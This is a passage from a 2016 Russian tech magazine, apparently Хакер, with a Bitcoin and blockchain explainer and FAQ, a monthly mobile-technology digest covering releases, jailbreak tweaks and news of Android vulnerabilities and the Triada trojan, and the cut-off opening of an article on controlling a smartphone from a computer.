Сторонники Bitcoin возлагали на первую децентрализованную электронную ва-
люту огромные надежды. Удастся ли их оправдать — большой вопрос, особенно
в России. Дело идет к тому, что в нашей стране Bitcoin просто запретят. Но даже
в том случае, если сбудутся самые пессимистические прогнозы, Bitcoin рано
сбрасывать со счетов. Самое интересное в нем — это технология, а не деньги.

БУХГАЛТЕРИЯ ДИКОГО ЗАПАДА
В основе Bitcoin лежит так называемая цепочка блоков транзакций, или блок-
чейн (blockchain), — грандиозная база данных, в которой хранятся сведения
обо всех операциях, совершенных с этой валютой. Блокчейн можно сравнить
с гроссбухом — главной бухгалтерской книгой, где фиксируют приход и расход
средств на балансе организации.
  В настоящем гроссбухе каждая строка представляет собой проводку — за-
пись об изменении баланса организации. В столбце «Дебет» бухгалтер указыва-
ет, насколько уменьшился ее баланс. В столбце «Кредит» — насколько он вырос.
   Записи в блокчейне очень похожи. У каждой отраженной в нем проводки, или,
если использовать жаргонное наименование, «транзакции», есть «входы» и «вы-
ходы». Баланс отправителя транзакции сокращается на сумму, которая указана
на ее входах. Выходы сообщают, насколько увеличится баланс получателей.





                                              Средства, на которые ссылаются входы
                                             транзакции, распределяют между одним
                                         или несколькими выходами. Остаток
                                          направляют на выход, адресованный
                                          самому себе, — это сдача
Похожие базы данных имеются у любой платежной системы или банка. При со-
вершении платежа они проверяют, что на счету клиента хватает средств, а за-
тем снимают деньги с его баланса и прибавляют к балансу получателя.
   Отличие сети Bitcoin в том, что она децентрализована. У нее нет верховного
сервера, который контролирует внесение изменений в базу данных и следит,
чтобы никто не тратил больше денег, чем имеет. Действующая копия блокчей-
на хранится на тысячах равноправных узлов, и добавлять туда новые записи
может кто угодно.
   Для банков и платежных систем такая ситуация немыслима. Если бы в их ба-
зах данных могли копаться посторонние, этим тут же воспользовались бы мо-
шенники. Ничто не помешало бы им переписать себе средства с чужих счетов
или расплатиться деньгами, которых у них нет.
  Но блокчейн — это не обычная база данных. Он с самого начала рассчитан
на использование в тех ситуациях, когда никому нельзя доверять. Именно это
и делает его интересным.





                                Первая в мире свадьба, зарегистрированная
                                  в блокчейне Bitcoin, состоялась в октябре 2014 года
СКОВАННЫЕ ОДНОЙ ЦЕПЬЮ
Главное свойство блокчейна — его неизменяемость. Если однажды туда попа-
ли сведения о проведенной сделке, то они останутся там навсегда. Их нельзя
ни удалить, ни отредактировать. И не потому, что это запрещено. Просто блок-
чейн устроен так, что даже мизерная правка требует невероятных вычислитель-
ных ресурсов.
   Механизм, обеспечивающий неизменяемость, на удивление прост. Блок-
чейн похож на башню из детских кубиков. Нельзя вытащить кубик из середины
и заменить его на другой, потому что тогда рухнет вся конструкция.
  Новые записи добавляют в блокчейн не по одной, а большими блоками.
Они в нашей метафоре соответствуют кубикам. У каждого блока есть уникаль-
ный идентификатор, которым служит криптографический хеш его заголовка.
Вычисление такого хеша — это сложная задача, которая занимает по меньшей
мере десять минут.
   Поскольку в заголовке каждого блока хранится идентификатор предыду-
щего, модификация одного блока вызывает цепную реакцию: меняются хеши
заголовков у всех блоков, которые добавлены позднее. Злоумышленнику при-
дется пересчитать хеши для каждого из них. Это безумно дорогая и сложная
задача, особенно если учесть, что каждый час блокчейн становится длиннее
на шесть блоков. Для победы злоумышленник должен догнать и перегнать все
честные узлы сети.
   Генерацией новых блоков для добавления в блокчейн занимаются майнеры.
Ты о них наверняка слышал — это те самые люди со специализированным же-
лезом, которые будто бы делают деньги из воздуха. В действительности май-
нерам отведена роль своего рода распределенной клиринговой палаты. Грубо
говоря, их работа гарантирует, что сделка проведена без нарушений, а инфор-
мация о ней достоверна. Генерация биткойнов — это лишь приятный побочный
эффект их деятельности.

ЗОЛОТАЯ ЛИХОРАДКА
Когда один из участников сети Bitcoin создает транзакцию, он сообщает о ней
всем соседним узлам, а те проверяют и передают ее дальше. Спустя несколько
секунд о сделке узнают все. Майнеры тоже участвуют в этой эстафете, но для них
она важна еще и по другой причине.
  Они независимо друг от друга составляют из принятых и проверенных тран-
закций новый блок, а затем наперегонки выполняют «доказательство выпол-
нения работы» (proof of work). Это самый долгий и трудоемкий этап создания
блока, но именно его продолжительность и трудоемкость гарантируют незы-
блемость блокчейна.
   «Доказательство работы» заключается в подборе идентификатора нового
блока. Им, как мы знаем, служит криптографический хеш его заголовка. При этом
согласно  правилам  его  величина
не должна превышать значения па-
раметра под названием «сложность»
(difficulty). Для подгона  результата
под «сложность» в заголовке блока
выделено четыре байта (nonce). Туда
подставляют различные числа и пе-
ресчитывают хеш до тех пор, пока ус-
ловие не будет выполнено. Значение
«сложности» подобрано таким обра-
зом, чтобы поиск подходящего числа
занимал примерно десять минут.
   Это гонка, в которой есть победи-
тели и проигравшие. Вознагражде-
ние получит лишь тот майнер, который
первым закончил работу, а остальные
останутся ни с чем. Сейчас награда
составляет 25 биткойнов (около 715
тысяч рублей) плюс «чаевые», при-
лагающиеся  к каждой  транзакции.
К июлю эта сумма, скорее всего, со-
кратится вдвое.
   Когда блок готов, победитель рас-
пространяет его по сети. Получив но-
вый блок, другие участники сети про-
веряют его. Только в том случае, если
и с ним, и с образующими его тран-
закциями все в порядке, они добавят
его в свои копии блокчейна.
   Неизменяемость блокчейна ме-
шает злоумышленникам отредакти-
ровать историю транзакций задним
числом, но этого мало. Нужно, чтобы
туда попадала только верная информация. Эта задача решается на уровне от-
дельных транзакций.

ПРОГРАММИРУЕМЫЙ НОТАРИУС
Транзакции не просто сообщают, откуда и куда будут переданы деньги. Они ука-
зывают на происхождение этих денег. Входы новой транзакции связаны с выхо-
дами предыдущей. Иными словами, они представляют собой ссылки на суммы,
заработанные в результате одной из прошлых сделок. Переходя по ссылкам
от транзакции к транзакции, можно проследить путь денег от момента созда-
ния до текущего обладателя.
   Сослаться на чужие деньги не дают замысловатые танцы с электронными
подписями и криптографическими ключами. Для нас в данном случае интерес
представляет не столько крипто, сколько тот факт, что условия сделки встроены
в саму транзакцию и представляют собой программы на примитивном стеко-
вом языке, напоминающем Forth. Можно сказать, что в Bitcoin скрипты играют
роль контрактов.
   Скрипты делятся на два типа: запирающие (scriptPubKey) и отпирающие
(scriptSig). Запирающий скрипт находится на одной стороне ссылки, соединя-
ющей выход старой транзакции со входом новой, а отпирающий — на другой.
Чтобы ссылка сработала, отпирающий скрипт получателя денег должен подой-
ти к запирающему скрипту отправителя.
   Для проверки ссылки запускают сначала отпирающий скрипт, а затем за-
пирающий. Отпирающий скрипт размещает на стеке данные для запирающего
скрипта, а запирающий изучает их и определяет, соблюдены ли условия, кото-
рые поставил отправитель. Деньги можно использовать только в том случае,
если проверка увенчалась успехом.
  Обычно отпирающий скрипт предъявляет электронную подпись, которая
сгенерирована на основе закрытого ключа создателя новой транзакции. За-
пирающий скрипт сверяет подпись с открытым ключом получателя и убежда-
ется, что отправитель адресовал перевод именно этому участнику сети. Это
не единственный возможный вариант, но примерно так работает большинство
транзакций с биткойнами.
  Каждый узел сети, в том числе и получатель денег, может проверить, откуда
взялись отправленные средства и обладал ли создатель транзакции правом их
тратить. Для незначительных переводов этого, как правило, достаточно, но риск
можно уменьшить, дождавшись включения транзакции в блокчейн. Это даст га-
рантию, что переводимые деньги не были использованы раньше. Подтвержде-
ние особенно крупных переводов занимает больше времени: блокчейн должен
вырасти настолько, чтобы расходы на пересчет добавленных блоков превыси-
ли доходы от обмана.

УМНЫЕ КОНТРАКТЫ
Возможности транзакции не исчерпываются передачей биткойнов от одного
участника другому по электронной подписи. Встроенный язык программирова-
ния позволяет ставить любые условия. Например, запирающий скрипт может
не требовать подписей вовсе. В этом случае отправленные деньги получает
первый желающий. Можно поступить наоборот и запросить подпись не одного
пользователя, а нескольких. Такой механизм бывает полезен в ситуациях, ког-
да для проведения сделки нужно согласие третьей стороны.
                                          Bitnation выпускает децентрализованные удосто-
                                   верения личности с регистрацией в блокчейне


В этом с самого начала заключалась задумка анонимного изобретателя крипто-
валюты, скрывающегося под псевдонимом Сатоси Накамото. В одном из пи-
сем, датируемых 2010 годом, он объяснял, что протокол Bitcoin позволяет ре-
ализовать огромное множество разновидностей транзакций: сделки с эскроу,
контракты с поручительством, разрешение споров третьей стороной и многое
другое. Это было сознательным заделом на будущее.
   Апологеты блокчейна идут еще дальше. Они полагают, что биткойн — это
лишь начало. Если криптовалюта конкурирует с традиционной финансовой
системой, не оставляя места ни для государственных центральных банков,
ни для частичного банковского резервирования, то другие применения этой
технологии должны взять на себя функции, которые выполняет государствен-
ная бюрократическая машина.
  С технической точки зрения в этом есть логика. Если блокчейн справляется
с хранением глобального гроссбуха, он подойдет и для, скажем, земельного
кадастра. Блокчейн мог бы служить публичным репозиторием данных целого
общества, в том числе реестров различных документов, событий и имущества.
С его помощью предлагают отслеживать права собственности на землю и не-
движимость, регистрацию коммерческих предприятий и браков, даже свиде-
тельства о рождении и смерти. Без коррупции, без лоббистов, без бюрокра-
тов, без налогов и без регулирования.
   Практическим примером невалютного использования блокчейна могут слу-
жить так называемые умные контракты. В отличие от обычных контрактов, кото-
рые составляют и интерпретируют люди, умные контракты представляют собой
компьютерные программы. Это делает их более предсказуемыми, объектив-
ными и точными.
   Вот как они могут действовать. Предположим, кто-то хочет оставить своему
внуку денежную сумму. Условием получения наследства будет либо смерть вла-
дельца денег, либо совершеннолетие получателя. Критерии оформляют в виде
транзакции, размещенной в блокчейне реестра умных контрактов. Для про-
верки первого критерия программный агент следит за официальными сооб-
щениями о смерти, которые публикуются в различных источниках. Для провер-
ки второго критерия текущую дату сравнивают с датой, когда внуку исполнится
18 лет. Когда один из критериев срабатывает, сумма, прикрепленная к умному
контракту, автоматически отправляется адресату.
  Все это — не только теория. Стартапы и разработчики проектов с открыты-
ми исходниками уже трудятся над реализацией новых применений блокчейна.
Компания Ripple предлагает банкам услуги по сделкам на базе блокчейна, в ко-
тором, среди прочего, действуют умные контракты. Проект Colored Coins позво-
ляет использовать биткойны в качестве виртуального отображения имущества
и проводить с ним различные операции. PrecedentCoin должна стать про-
граммным эквивалентом прецедентной судебной системы. LiquidFeedback —
это, по сути дела, представительская демократия на базе блокчейна. Наконец,
в рамках проекта World Citizenship разрабатывают криптографические распре-
деленные удостоверения личности.

ФАНТАЗИИ И РЕАЛЬНОСТЬ
Увы, утопический анархо-капитализм, о котором фантазируют любители блок-
чейна, с трудом выдерживает проверку реальностью. Показательнее всего
трудности, с которыми в последнее время сталкивается сама сеть Bitcoin.
   Децентрализация — не только свойство, но и условие работы Bitcoin. Если
значительное количество узлов будет сосредоточено в одних руках, механизм
проверки подлинности транзакций начнет давать сбои. Сегодня эта угроза уже
не кажется фантастической.
   Жестокая конкуренция между майнерами привела к тому, что для участия
в гонке требуется специализированное оборудование и значительный стар-
товый капитал. В результате майнинг централизуется семимильными шагами.
Большинство новых блоков давно добавляют не одиночки, а один из немного-
численных майнерских пулов. Их вычислительные ресурсы приближаются к 51
проценту ресурсов всей сети — порогу, который позволяет контролировать,
что считается правдой, а что ложью.





                                Сегодняшние майнеры — это не одиночки, а вла-
                                дельцы целых специализированных дата-центров`

Другая серьезная проблема связана с пропускной способностью сети Bitcoin.
По данным 2015 года, она обрабатывает одну транзакцию в секунду. При этом
теоретический предел соответствует семи транзакциям в секунду. Для сравне-
ния: платежная система VISA обслуживает 2000 транзакций в секунду при пико-
вой нагрузке 10 000 транзакций в секунду.
   Если пропускную способность Bitcoin удастся увеличить до уровня VISA,
возникнет другое затруднение. При таком количестве сделок блокчейн будет
каждый год удлиняться на 1,42 Пбайт. Между тем огромные размеры блокчей-
на уже сейчас стали фактором, который вредит децентрализации.
  В начале апреля 2016 года блокчейн Bitcoin занимал 64 Гбайт и продолжал
стремительно расти. Из-за этого большинство узлов сети не хранят полную
копию блокчейна, а лишь запрашивают выдержки из него у других. В прошлом
году количество копий блокчейна оценивалось в семь тысяч. Это ужасающе
мало.
  Еще пагубнее для Bitcoin то, что государственные органы многих стран либо
не доверяют криптовалютам, либо полностью отвергают их. Кое-где Bitcoin уже
запрещен. В частности, криптовалюту нельзя использовать в Исландии, Бан-
гладеш, Боливии, Эквадоре, Кыргызстане и Вьетнаме. В декабре 2013 года
китайские власти запретили финансовым организациям проводить операции
с Bitcoin.
  В России перспектива запрета криптовалюты тоже становится все более
и более реальной. В конце 2015 года Роскомнадзор заблокировал несколь-
ко крупных сайтов о Bitcoin. Причиной якобы стал законодательный запрет
на выпуск денежных суррогатов. Впрочем, сам по себе Роскомнадзор — это
не столько проблема, сколько ее симптом.
  В начале марта 2016 года стало известно, что Минфин разрабатывает по-
правки к уголовному кодексу: за выпуск денежных суррогатов, к которым могут
быть отнесены и криптовалюты, хотят ввести суровые наказания. Если этому
предложению дадут ход, за выпуск биткойнов будут сажать на срок до четырех
лет и штрафовать на 500 тысяч рублей. Для руководителей банков и финан-
совых компаний наказание еще жестче: семь лет и штраф до 2,5 миллиона
рублей.
   Впрочем, кто обещал, что будет легко?
                                         Алексей Глазков
           FAQ

ЧЕМ BLOCKCHAIN ЛУЧШЕ ДРУГИХ СИСТЕМ?
Внутреннее устройство блокчейна успешно решает так называемую задачу
византийских генералов. Это криптологическая проблема, связанная с устой-
чивостью криптосети в условиях внутренней конкуренции и вероятного «преда-
тельства» ее членов.
    Как же ее устраняет блокчейн? Строго говоря, никак. Блокчейн всего лишь:
•  усложняет подделку каждого конкретного «приказа» достаточно для того,
   чтобы это стало невыгодно для атакующего;
•  вовлекает в принятие решения достаточно большое количество узлов сети,
   чтобы борьба с ними стала менее выгодной, чем кооперация.
Современные платежные системы не предоставляют даже такого уровня на-
дежности. Однако проблема 50% + 1 остается и в блокчейне: достаточно
завладеть более чем третью всех узлов сети, чтобы парализовать ее работу,
и более чем половиной — чтобы полностью подчинить ее себе. Это не един-
ственная проблема — есть и другие.

ЕСЛИ КТО УГОДНО МОЖЕТ ДОБАВИТЬ БЛОК В БЛОКЧЕЙН,
ПОЧЕМУ ПОЛУЧАЕТСЯ ЦЕПОЧКА, А НЕ ДЕРЕВО?
Это второе жесткое условие, «зашитое» изобретателем технологии блокчейна
Сатоси Накамото в алгоритм: цепь постоянно отбрасывает «лишние» блоки.
   Блокчейн фактически не совсем цепь: это «публичный коллективный
реестр», где понятие «коллективный» не менее важно, чем «реестр». Слово «ре-
естр» здесь указывает на технологию выстраивания связей; «коллективный» —
на технологию их отбора. Без отбора вся структура действительно преврати-
лась бы в «дерево» (и называлась бы Blocktree). Но в каждый момент времени
сеть просчитывает длину порожденных майнерами «ветвей» и простым голосо-
ванием узлов выбирает самую длинную ветвь. Остальные безжалостно выбра-
сываются, усилия майнеров, их породивших, не вознаграждаются, а транзак-
ции исчезают, словно их и не было. Избыточность — не самая большая цена за
устойчивость.
  Важно понимать, что «длина» ветви — это не только количество блоков в ней,
но и кумулятивные «сложность» и «информативность» этих блоков. Поэтому вы-
бор всегда однозначен, двух одинаковых ветвей быть не может.
  К сожалению, подробности не сообщают ни члены Core Team, ни сам
Сатоси. Но если ты заинтересовался — будет нелишним почитать оригиналь-
ное описание технологии (pdf).

СКОЛЬКО ТРАНЗАКЦИЙ МОЖЕТ БЫТЬ В БЛОКЕ?
Теоретически — сколько угодно. Однако, например, в биткойне, самой попу-
лярной на сегодня реализации блокчейна, размер блока ограничен и состав-
ляет один мегабайт, что позволяет уместить в него максимум порядка 5000
простейших транзакций (с одним отправителем и одним получателем). Отсюда,
кстати, высчитывается и максимальная пропускная способность сети Bitcoin,
которая составляет семь транзакций в секунду.

ПОЧЕМУ СЧИТАЕТСЯ, ЧТО СОЗДАВАТЬ НОВЫЕ БЛОКИ ТЯЖЕЛО?
Ответом опять же будет «так решил Сатоси». Надежность системы достигает-
ся благодаря криптографической защите с помощью функции Hashcash, изо-
бретенной еще в 1997 году. Hashcash — это обертка, внутри которой по мере
исторического развития использовались MD5, SHA-1, SHA-256, ECDSA и дру-
гие криптоалгоритмы. Сейчас блокчейн шифрует блоки двойным проходом
SHA-256 (это называется «SHA-256 squared function») по заголовку блока, со-
держащему всю важную информацию:

Block_Header = [Version,hashPrevBlock,hashMerkleRoot,Time,Bits,Nonce]
Hash = SHA256(SHA256(Block_Header))

Одноразовое создание такого хеша на хорошем оборудовании занимает ме-
нее миллисекунды. Вся сложность в том, что оно не одноразовое: вычисление
должно повторяться столько раз, сколько понадобится, чтобы добиться необ-
ходимого количества нулей в начале хеша (которое каждые две недели авто-
матически подстраивается сетью). Именно этим способом Сатоси и добился
«тяжелого» вычисления proof of work и одновременно — «легкого» вычисления
его валидности.
MOBILE





                                                                                 Евгений Зобнин
                                                                                                                 androidstreet.netДАЙДЖЕСТ
                              ANDROID N,
                           CYANOGENMOD
                                           13, IOS 9.3,
                            МАЛЕНЬКИЙ
                                IPHONEНОВОСТЕЙ
                           И МНОГОЕ
                              ДРУГОЕЗА МЕСЯЦ
С этого выпуска мы начинаем публикацию ежемесячных
дайджестов событий, произошедших в мире мобильных
технологий. Здесь будет все: инфа об обновлении мо-
бильных ОС, популярных приложений и прошивок, новые
интересные приложения и твики, инфа о свежих уязвимо-
стях и всем, что связано с security, инструменты для раз-
работчика мобильных приложений, а также ссылки на лю-
бопытные публикации и исследования, на которые стоит
обратить внимание. Приятного чтения, и не забывай
оставлять комментарии.

РЕЛИЗЫ
Март выдался чрезвычайно богатым на релизы. Обновились не  толь-
ко iOS и Android, но и CyanogenMod, Remix OS и даже никому не известная
AsteroidOS  для  смарт-часов. Подробно о  низкоуровневых  изменениях
в Android N я написал в своей колонке, а те, кому интересно, как поменялся
внешний облик ОС и какие рюшечки в ней появились, уже наверняка прочита-
ли об этом. Отметить можно разве что режим разделения экрана, режим эко-
номии трафика и существенное снижение времени установки приложения (за
счет чего это сделано — читай опять же в колонке).
   Почти одновременно с Android обновилась iOS. Теперь в ней есть
уже ставший известным режим Night Mode, снижающий цветовую температуру
дисплея, отчего глаза меньше утомляются, а выработка организмом мелато-
нина не приостанавливается. К слову сказать, та же функция уже давным-дав-
но доступна в приложении  f.lux для джейлбрейкнутых устройств, а также
в Android-прошивке CyanogenMod и приложении CF.lumen для Android же.
   Также в новой iOS появились новые действия 3D Touch для иконок настроек,
калькулятора, App Store, Campus, Health, iTunes Store, Stocks и погоды. Заметки
теперь можно защитить с помощью отпечатка пальца. Ну и порция улучшений
во встроенных приложениях.
  Одновременно с iOS были представлены четырехдюймовый iPhone SE, та-
кой же мощный, как iPhone 6s (это хорошо, что Apple все-таки одумалась и по-
няла, что не все любят фаблеты), и уменьшенная версия iPad Pro с диагональю
экрана 9,7». По начинке он схож со старшим братом, но есть множество мелких
различий в камере, объеме встроенной памяти и батарее. Больше всего инте-
реса, однако, вызвали не новые устройства, а тот самый робот Liam, разбира-
ющий в Apple старые iPhone.
   Что касается CyanogenMod 13, то здесь все просто. Те, кто использовал
ночные сборки, не увидят ничего нового, а те, кто переходят с версии 12.1,
должны быть готовы к следующим изменениям:
•  WhisperPush (средство для обмена зашифрованными СМС) удален;
•  управление отображаемыми тайлами быстрых настроек в шторке теперь
   происходит на месте, а не через настройки;
•  раздел настроек «Память» отображает среднее использование оператив-
   ной памяти за указанный промежуток времени;
•  приложения теперь можно защищать с помощью отпечатка пальца;
•  СМС-приложение от Qualcomm заменено на AOSP-аналог;
•  для устройств на базе Qualcomm Snapdragon теперь используется камера
   разработки Qualcomm.

СОФТ
За месяц в маркетах всех мобильных ОС успевают появиться сотни самых
разных приложений. Большинство из них, конечно же, не достойны никакого
внимания, однако всегда можно найти несколько действительно интересных
софтин. В этом месяце мы хотели бы остановиться на следующих:
• HOUND — голосовой ассистент от известной компании SoundHound.
  По сути, аналог Siri и Google Now с несколькими отличиями: очень высокая
   скорость работы, отсутствие команд как таковых (ты просто разговариваешь
   с приложением), интеграция со многими сервисами, включая AccuWeather,
   Expedia, Uber и Yelp. Помощник очень развитый, но пока работает только
   с английским языком и поддерживает далеко не все смартфоны.
•   f.lux — известное приложение для автоматического управления цветовой
   температурой дисплея наконец-то добралось до Android. Требует root и ни-
   чем особо не отличается от проверенного временем CF.lumen.
•  Red Moon — аналог f.lux и CF.lumen для Android, не требующий root. Рабо-
   тает за счет создания цветового фильтра поверх изображения. Полностью
   бесплатное и открытое приложение, недоступное тем не менее в маркете
   (только в альтернативном маркете F-Droid).
•  Magnesium Launcher — рабочий стол для Android с интересной концепцией
   построения рабочего пространства. Главный экран рабочего стола не со-
   держит иконок, а вместо этого отображает ленту, в которую сыплются пись-
   ма, СМС, звонки, сообщения в Twitter и Facebook. Чем-то похоже на рабо-
   чий стол старой доброй Windows Mobile и лаунчер SlideScreen (уже давно
   заброшенный).

Отдельно хотелось бы отметить приложение Extensify для iOS. Это не что
иное, как инсталлятор твиков, работающий даже на невзломанных устрой-
ствах! Как такое возможно? Очень просто: Extensify скачивает приложение
из App Store, а затем отправляет его на уда-
ленный сервер, где приложение перепако-
вывается с включением в него дополнитель-
ных библиотек, реализующих расширенную
функциональность  (внедрение  функций
происходит таким же образом, как в клас-
сических твиках, — с помощью хуков), затем
приложение закачивается на устройство
и устанавливается.
   Однако у такого метода есть ряд огра-
ничений. Во-первых, он работает  только
в отношении приложений, изменить пове-
дение самой системы не получится. Во-вто-
рых, поддерживаются  только бесплатные
приложения. А в-третьих, начиная с iOS 9.3
для установки модифицированных приложе-
ний необходимо подключение к ПК.

ТВИКИ
В этом месяце в Jailbreak community произо-
шло важное событие — команда Pangu вы-
пустила непривязанный джейлбрейк для iOS
9.1. Почему 9.1? Потому что взломать 9.2 так
и не удалось (но джейлбрейк, скорее всего,
будет для iOS 9.3). Сама процедура джей-                                                       Magnesium Launcher
лбрейка осталась прежней: качаем, нажима-
ем пару кнопок, ждем.
   Чтобы узнать, какие твики совместимы с iOS 9.1, можно использовать та-
блицу в Google spreadsheets, созданную пользователями Reddit. В ней пере-
числены все популярные твики, совместимые с iOS 9.1. Некоторые из них со-
вместимы только частично.
   Если же говорить о новых твиках, появившихся в этом месяце, то в пер-
вую очередь внимание следует обратить на QuickCenter. После его установ-
ки в Control Center появится поддержка 3D Touch: иконка Wi-Fi будет реаги-
ровать на сильное нажатие показом списка сетей, Bluetooth покажет список
устройств рядом, будильник — список будильников и так далее. Цена твика —
один доллар.
  QuickCenter


Второе место занимает Chrome Handoff, бесплатный твик из репозитория
BigBoss, добавляющий в Chrome поддержку функции Handoff, то есть позволя-
ющий синхронизировать состояние браузера, запущенного на Маке, и брау-
зера в мобильнике. Все, что нужно сделать, — установить твик и активировать
функцию Handoff на компе и на смартфоне/планшете.
  Еще три интересных твика:
• 3D Touch Notifications — твик добавляет поддержку 3D Touch для уведом-
   лений, отображаемых в Notification Center и на экране блокировки. После
   сильного нажатия уведомления на экране появится окно с запущенным
   приложением.
•  Wolfram — очень простой твик, который всего лишь переводит смартфон
   в режим Low Power Mode при подключении к зарядке. По идее, скорость за-
   рядки должна возрасти, однако подход довольно спорный, особенно если
   учесть, что именно на зарядке смартфон выполняет многие важные проце-
   дуры, включая бэкап в iCloud, который при активации LPM отключается.
•  FastShare — позволяет быстро опубликовать сообщение в Facebook, Twitter
   и Messages с помощью действия Activator.





  FastShare
БЕЗОПАСНОСТЬ
Март стал месяцем, который производители антивирусного ПО просто обяза-
ны обвести в кружок и вспоминать годы спустя. И все благодаря одному троя-
ну для Android.
   3 марта сотрудники «Лаборатории Касперского» опубликовали большое
исследование, посвященное самому сложному и продвинутому Android-троя-
ну Triada. Троян не только умеет перехватывать и перенаправлять СМС и обла-
дает модульной архитектурой, позволяющей расширять возможности зловре-
да в какую угодно сторону, но и обладает весьма изощренной архитектурой.
   Главная фишка Triada — это способность инфицировать процесс Zygote,
который является родителем всех приложений, работающих в Android. Троян
изменяет Zygote прямо в оперативной памяти, внедряя в него код, позволяю-
щий перехватывать СМС и функции API, предназначенные для получения спи-
ска установленных и запущенных приложений. Так как все приложения и боль-
шинство системных сервисов, по сути, клоны Zygote, троян в прямом смысле
инфицирует всю систему и становится полностью незаметным. Очень продви-
нутый зловред и отличный ресерч Kaspersky Lab.
   Теперь об уязвимостях. 8 марта компания TrendMicro сообщила о двух уяз-
вимостях, обнаруженных в коде поддержки чипсетов Qualcomm Snapdragon
в ядре Linux (CVE-2016-0819 и CVE-2016-0805). Каждая из них может быть ис-
пользована для получения прав root локально, однако, каким именно образом,
компания обещает сообщить только в мае на конференции Hack In The Box.
   Google уже выпустила исправление уязвимостей в рамках ежемесячного
security-обновления. Патчи доступны для версий Android от 4.4.4 до 6.0.1 вклю-
чительно, однако, зная, с каким «рвением» производители устройств выпу-
скают обновления, можно предположить, что миллионы (сотни миллионов?)
устройств останутся уязвимыми. Радует только то, что в ближайшее время
проблема рутинга устройств нам не грозит.
   22 марта компания Zimperium, та самая, что нашла первую уязвимость
Stagefright прошлым летом, выпустила отчет с анализом распространенности
уязвимости на Android-смартфонах. Цифры неутешительные: 42,84% устройств
подвержены уязвимости CVE-2015-3864, самой распространенной (вплоть
до Android 5.1) и удобной в использовании среди всех Stagefright-уязвимостей.
Это от 600 до 850 миллионов устройств.
Архитектура трояна Triada
                                             Уязвимость CVE-2015-3864 по странам

Напомним, что уязвимости в библиотеке Stagefright находят до сих пор, их
уже больше десятка, так что рекомендуем установить Stagefright Detector
и, в случае если устройство уязвимо, очень осторожно открывать непонятные
ссылки, MMS и вообще любой мультимедиаконтент. А еще лучше установить
CyanogenMod, если, конечно, он доступен для твоего смартфона.
  Пара слов о хорошем. Разработчики защищенной Android-прошивки
CopperheadOS объединяют усилия с ребятами из проектов Guardian Project
(они делают privacy-софт: Orbot, ChatSecure и другие) и F-Droid («магазин» от-
крытого софта для Android) для создания privacy-ориентированной открытой
системы. Новость, надо сказать, отличная, потому как связка этих трех проек-
тов дает практически полную защиту от прослушки и утечек данных с макси-
мально возможной защитой от взлома устройства.
ПОЧИТАТЬ
Study on Android emulator — интересное ис-
следование эмулятора Android от тайваньско-
го инженера Mozilla. Презентация охватывает
многие аспекты работы эмулятора, включая
механизм коммуникации между эмулятором
и IDE, реализацию стандартной ARM-плат-
формы  goldfish, отличия нового эмулятора
(AndroidStudio 2.0) от устаревшего, реализа-
цию эмуляции модема, GPS и других компо-
нентов платформы.
   SamDunk: eMMC backdoor leading to bootloader
unlock on Samsung Galaxy Devices (pdf) — занима-
тельный рассказ о том, как был взломан загруз-
чик Samsung Galaxy S5. Смартфон использует до-
вольно интересную технику разлочки загрузчика,
основанную на сверке eMMC CID: разлоченные
dev-версии смартфона проходят специальную
заводскую процедуру, в ходе которой eMMC CID
устройства шифруется и записывается в раз-
дел aboot. При каждой загрузке смартфона за-
грузчик извлекает его из раздела, дешифрует, и,
                                                        Уязвимый смартфон
если записанный CID совпадает с актуальным,                                                            на базе Android 5.1
загрузчик считается разблокированным.





  Один из слайдов презентации
   Как следствие, самый простой способ разблокировать загрузчик на любом
смартфоне состоял в том, чтобы прошить в него раздел aboot от разблокиро-
ванного смартфона, а затем изменить eMMC CID так, чтобы он совпадал с тем,
что записан в раздел. По стандарту eMMC CID меняться не должен, но исследо-
вание кода прошивки eMMC показало, что в данном случае это не так и для из-
менения eMMC CID даже предусмотрена специальная сервисная команда.
   Metaphor: A (real) reallife Stagefright exploit (pdf) — подробный рассказ о соз-
дании эксплоита для уязвимости CVE-2015-3864 (Stagefright). Документ осо-
бенно интересен тем, что покрывает все этапы исследования и разработки,
и в подробностях объясняет, как найти уязвимость и использовать ее в своих
целях, включая рассказ о методах обхода ASLR. Must read для всех, кто хочет
разобраться в современных способах взлома.





            Количество свободной памяти до и после запуска NFS No Limits
   Эмуляция и перехват SIM-команд через SIM Toolkit на Android 5.1 и ниже
(CVE-2015-3843) — интересное исследование Positive Technologies, посвящен-
ное глупой ошибке в Android, позволяющей перехватывать и эмулировать со-
общения, генерируемые SIM-картой. В частности, ошибка может быть исполь-
зована для перехвата сообщений подтверждения операций в интернет-банке.
Причем делается это очень просто.
   iPhone Dual Boot — пост на Reddit о том, как организовать двойную загрузку
на взломанном iPhone (установить две разные версии iOS). Инструкция охва-
тывает все аспекты подготовки, включая установку утилит для переразбивки
памяти на разделы, сам процесс переразбивки и установки модифициро-
ванного загрузчика. К сожалению, возможности выбора операционки прямо
на смартфоне не предусмотрено, так что для этих целей придется подключать
смартфон к ПК и перепрошивать загрузчик.
   The RAM Conundrum: How Much RAM Do We Really Need? — колонка одного
из авторов XDA Developers, который пытается найти ответ на вопрос: а нужны ли
нам смартфоны с шестью гигабайтами оперативной памяти? Ответ, как и следо-
вало ожидать, простой: пока с лихвой хватает трех гигабайт, но с усложнением
приложений и увеличением разрешений экрана может понадобиться больше.
   Однако интересен не вывод, сделанный автором, а его рассказ о принци-
пах работы системы управления памятью Android. Здесь он абсолютно вер-
но подмечает, что в основном память нужна для кеширования запущенных
приложений, а также что многое зависит от размера хипа (кучи), выделяемо-
го на каждое приложение. Размер этот определяется создателями смартфо-
на, а потому два аппарата с одинаковым количеством памяти могут работать
по-разному (например, на одном смартфоне браузер сможет закешировать
пятнадцать страниц, открытых в браузере, а на другом только пять). С другой
стороны, автор забывает о том, что ядро Linux очень агрессивно использует
свободную память для хранения файлового кеша, что тоже весьма немало-
важный параметр.
MOBILE

                    УПРАВЛЯЕМ
                  СМАРТФОНОМ
                  С КОМПАРОБОТ
НА ПОВОДКЕ
В февральском номере журнала я описывал,
как выжать максимум возможностей из го-
лосового управления телефоном. Но когда
весь день находишься за компом, да еще
и не один, или вокруг слишком шумно, то ко-                                                                          Дмитрий «BRADA»
                                                                                 Подкопаевмандовать вслух бывает не совсем удобно,                                                                                               john.brada.doe@gmail.com
а иногда можно вызвать неодобрение окру-
жающих. Так что сегодня поговорим о том,
как управлять телефоном/планшетом, не от-
рываясь от компа.

Чтобы рулить смартфоном с компа, в современном мире
не надо ничего, кроме самого смартфона, подключения
по сети Wi-Fi и пары десятков мегабайт проплаченного
